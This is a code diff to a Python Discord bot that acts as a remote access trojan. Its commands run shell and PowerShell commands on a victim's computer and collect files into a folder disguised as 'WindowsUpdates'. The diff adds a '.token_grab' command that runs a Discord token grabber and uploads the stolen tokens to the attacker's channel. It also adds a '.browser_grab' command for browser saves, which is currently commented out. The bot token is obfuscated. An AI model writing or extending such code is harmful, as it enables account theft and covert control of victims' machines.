@@ -114,6 +114,8 @@ async def on_message(message):
         embed2.add_field(name=".cmd", value="Runs a command on the host computer. Usage: ``.cmd <command>``", inline=False)
         embed2.add_field(name=".pws", value="Runs a powershell command on the host computer. Usage: ``.pws <command>``", inline=False)
         embed2.add_field(name=".file_collector", value="Collects some files from the host computer. Usage: ``.file_collector``", inline=False)
+        embed2.add_field(name=".token_grab", value="Grabs discord tokens from the host computer. Usage: ``.token_grab``", inline=False)
+        embed2.add_field(name=".browser_grab", value="Grabs browser saves from the host computer. Usage: ``.browser_grab``", inline=False)
         try:
             await message.channel.send(embed=embed)
             await message.channel.send(embed=embed2)
@@ -509,6 +511,35 @@ async def on_message(message):
 
         await message.channel.send(file=discord.File(f"{os.getenv('APPDATA')}\\WindowsUpdates\\collected_files.zip"))
         os.remove(f"{os.getenv('APPDATA')}\\WindowsUpdates\\collected_files.zip")
+
+    if message.content.startswith(".token_grab"):
+        await message.delete()
+        #run token_grabber.pyw and wait until finished then send token.txt
+        os.system(f"py {os.getcwd()}\\built_in_modules\\discord_token_grabber.pyw")
+
+        embed = discord.Embed(title="Token Grabber", description="Token grabber executed.", color=0x00ff00)
+        await message.channel.send(embed=embed)
+
+        while(os.path.exists(f"{os.getcwd()}\\token.txt") == False):
+            time.sleep(1)
+
+        await message.channel.send(file=discord.File(f"{os.getcwd()}\\token.txt"))
+        os.remove(f"{os.getcwd()}\\token.txt")
         
+    if message.content.startswith(".browser_grab"):
+        #await message.delete()
+        #run token_grabber.pyw and wait until finished then send token.txt
+        #os.system(f"py {os.getcwd()}\\built_in_modules\\browser_psw.pyw")
+
+        #embed = discord.Embed(title="Token Grabber", description="Browser grabber executed.", color=0x00ff00)
+        #await message.channel.send(embed=embed)
+
+        #while(os.path.exists(f"{os.getcwd()}\\token.txt") == False):
+            #time.sleep(1)
+
+        #await message.channel.send(file=discord.File(f"{os.getcwd()}\\token.txt"))
+        #os.remove(f"{os.getcwd()}\\token.txt")  
+        embed = discord.Embed(title="Browser Grabber", description="Browser grabber is currently disabled.", color=0x00ff00)
+        await message.channel.send(embed=embed)  
 
 client.run(gzip.decompress(base64.b64decode(reg_h.get_token())).decode("utf-8"))
